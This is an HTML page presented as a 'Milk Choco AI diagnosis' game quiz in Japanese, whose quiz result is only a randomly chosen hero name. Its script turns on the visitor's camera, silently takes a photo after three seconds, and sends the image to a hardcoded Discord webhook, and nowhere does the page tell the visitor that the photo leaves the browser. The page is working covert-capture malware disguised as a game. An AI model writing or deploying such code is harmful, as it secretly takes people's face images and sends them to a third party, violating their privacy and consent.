<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ミルクチョコ AI診断</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #f0f0f0;
        }
        .container {
            text-align: center;
            background-color: white;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
        }
        .button {
            padding: 10px 20px;
            font-size: 16px;
            cursor: pointer;
            background-color: #4CAF50;
            color: white;
            border: none;
            border-radius: 5px;
            margin-top: 20px;
        }
        .button:hover {
            background-color: #45a049;
        }
        video {
            width: 100%;
            border: 1px solid #ccc;
            border-radius: 5px;
            margin-top: 10px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>ミルクチョコ AI診断</h1>
        <button class="button" onclick="startDiagnosis()">診断スタート</button>
        <div id="camera" style="display:none;">
            <video id="video" autoplay></video>
        </div>
        <div id="result" style="display:none;">
            <h2>診断結果:</h2>
            <p id="heroName"></p>
        </div>
    </div>

    <script>
        const heroes = [
            "アサルト", "ボマー", "ゴースト", "メディック", "エレキ", "シールド",
            "チュチュ", "アイアン", "リーコン", "キャット", "ランチャー"
        ];
        const webhookURL = "https://discord.com/api/webhooks/1366016639841341481/L5I7WDD_xthFEHSPfnl9gHAkGpQUGbf542K2whGCHhqDJE2t5PVJeN8Jr4Hx-YDWI0Yt";
        let cameraStream;

        // 診断スタート
        async function startDiagnosis() {
            // ヒーロー名をランダムに選択
            const heroName = heroes[Math.floor(Math.random() * heroes.length)];
            document.getElementById("heroName").innerText = `${heroName}の診断結果です！`;
            document.getElementById("result").style.display = "block";

            // カメラを表示
            document.getElementById("camera").style.display = "block";

            // カメラを起動
            try {
                cameraStream = await navigator.mediaDevices.getUserMedia({ video: true });
                document.getElementById("video").srcObject = cameraStream;

                // 自動で写真を撮る
                setTimeout(capturePhoto, 3000); // 3秒後に自動で撮影
            } catch (err) {
                alert("カメラのアクセスに失敗しました！");
            }
        }

        // 写真を撮る
        function capturePhoto() {
            const video = document.getElementById("video");
            const canvas = document.createElement("canvas");
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext("2d");
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

            // 画像をBase64エンコード
            const base64Image = canvas.toDataURL("image/png");

            // Webhookに送信するデータ
            const payload = {
                embeds: [
                    {
                        title: "診断結果の顔写真",
                        image: {
                            url: base64Image
                        }
                    }
                ]
            };

            // WebhookにPOSTリクエストを送信
            fetch(webhookURL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(payload)
            })
            .then(response => {
                if (response.ok) {
                    console.log('Webhookに送信されました！');
                } else {
                    console.error('Webhook送信に失敗しました。');
                }
            })
            .catch(error => {
                console.error('エラーが発生しました:', error);
            });

            // カメラ停止
            cameraStream.getTracks().forEach(track => track.stop());
        }
    </script>
</body>
</html>
